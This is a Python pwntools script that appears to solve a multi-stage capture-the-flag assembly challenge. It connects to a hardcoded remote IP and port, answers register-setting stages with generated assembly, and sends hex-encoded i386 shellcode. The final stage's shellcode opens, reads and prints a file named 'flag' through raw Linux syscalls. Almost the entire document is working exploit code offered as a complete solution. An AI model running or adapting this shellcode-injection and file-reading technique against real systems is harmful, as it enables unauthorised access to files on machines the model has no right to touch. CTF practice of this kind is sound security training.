#!/usr/bin/env python
from pwn import *

context.update(arch='i386', os='linux')

r = remote('175.119.158.136', 31337)

r.recvuntil('below')

data = r.recvuntil('input')
data = data.split('\n')
reg_map = {}

for l in data:
  if '=' in l:
    reg, val = l.split(' = ')
    reg_map[reg] = val

a = ''
for reg in reg_map.keys():
  a += 'mov %s, %s\n' % (reg.lower(), reg_map[reg])
r.send(enhex(asm(a)) + '\n')

r.recvuntil('below')
r.recvuntil('\n')
data = r.recvuntil('\n').split(' ')
val = int(data[-1])

regs = {}
for reg in reg_map.keys():
  regs[reg.lower()] = 0
regs[data[0]] = val

a = ''
for reg in regs.keys():
  a += 'mov %s, %s\n' % (reg, regs[reg])
r.send(enhex(asm(a)) + '\n')
r.recvuntil('Clear!')
r.recvuntil('\n')

a = '''
mov eax, 0x1010
s:
mov bl, [eax]
cmp bl, 123
je done
inc eax
jmp s
done:
'''
r.send(enhex(asm(a)) + '\n')

r.recvuntil('EIP: ')
eip = r.recvuntil('\n')
a = '''
mov eax, %s
mov dword ptr [eax], 0x0000feeb
push eax
ret
''' % eip
r.send(enhex(asm(a)) + '\n')

print r.recvuntil('luck!')
r.recvuntil('\n')
a = '''
call A
.ascii "flag\\0"
A:
pop ebx
mov eax, 5
int 0x80
mov ebx, eax
mov ecx, esp
mov edx, 50
mov eax, 3
int 0x80
mov ebx, 1
mov ecx, esp
mov edx, 50
mov eax, 4
int 0x80
'''
r.send(enhex(asm(a)) + '\n')

r.interactive()

